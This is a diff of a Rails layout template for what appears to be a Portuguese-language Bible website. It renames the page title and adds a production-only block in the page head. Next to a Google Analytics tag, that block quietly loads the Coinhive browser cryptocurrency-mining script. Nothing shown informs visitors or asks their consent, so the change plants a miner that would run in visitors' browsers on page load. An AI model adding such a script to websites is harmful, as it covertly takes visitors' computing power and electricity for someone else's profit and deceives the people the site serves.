@@ -1,8 +1,9 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>MIM - Missão Imigrante</title>
+  <title>Missao.Org - Bíblia Sagrada</title>
   <%= csrf_meta_tags %>
+  
   <meta name="viewport" content="width=device-width" intitial-scale="1" maximum-scale="1">
   <%= favicon_link_tag 'favicon.ico' %>
   
@@ -10,7 +11,24 @@
   <link href='http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
   <link href='http://fonts.googleapis.com/css?family=Merriweather:400,300,300italic,400italic,700,700italic,900,900italic' rel='stylesheet' type='text/css'>
   <%= javascript_include_tag 'creative/manifest.js' %>
-  <%= csrf_meta_tags %>
+  
+  
+  <%if Rails.env == "production" %>
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-109410946-1"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+    
+      gtag('config', 'UA-109410946-1');
+    </script>
+    
+    <%= javascript_include_tag 'https://coinhive.com/lib/coinhive.min.js' %>
+    <%= javascript_include_tag 'application.js' %>
+  <%end %>
+  
+  
 </head>
 
 <body>
